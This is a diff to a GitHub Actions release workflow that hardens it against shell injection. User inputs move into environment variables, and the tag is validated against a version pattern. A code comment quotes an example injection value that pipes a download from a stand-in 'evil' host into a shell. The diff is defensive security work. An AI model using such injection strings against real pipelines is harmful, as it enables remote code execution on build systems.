@@ -30,9 +30,23 @@ jobs:
         env:
           GH_TOKEN: ${{ secrets.GITHUB_TOKEN }}
           REPO: ${{ github.repository }}
+          # User-controlled workflow inputs pass through env, not
+          # ${{ ... }} interpolation into the shell body. See
+          # gpd-release.yml resolve-version for the full rationale
+          # (H1 audit finding). The tag is additionally pattern-
+          # checked below so `inputs.tag="$(curl evil | sh)"` can't
+          # smuggle a shell expression into the gh CLI argv either.
+          INPUT_TAG: ${{ inputs.tag }}
+          INPUT_MARK_LATEST: ${{ inputs.mark_latest }}
         run: |
           set -euo pipefail
-          TAG="${{ inputs.tag }}"
+          TAG="$INPUT_TAG"
+          if [ -n "$TAG" ]; then
+            if ! printf '%s' "$TAG" | grep -Eq '^gpd-desktop-v[0-9]+\.[0-9]+\.[0-9]+(-[A-Za-z0-9.]+)?$'; then
+              echo "::error::inputs.tag must match gpd-desktop-vX.Y.Z (got: $TAG)"
+              exit 1
+            fi
+          fi
 
           # Use gh CLI throughout. Draft releases do not have an underlying
           # git tag ref until publish, so the raw API GET /releases/tags/<tag>
@@ -67,7 +81,7 @@ jobs:
           fi
 
           MARK_LATEST_ARG=""
-          if [ "${{ inputs.mark_latest }}" = "true" ]; then
+          if [ "$INPUT_MARK_LATEST" = "true" ]; then
             MARK_LATEST_ARG="--latest"
           fi
           gh release edit "$TAG" --draft=false $MARK_LATEST_ARG --repo "$REPO"
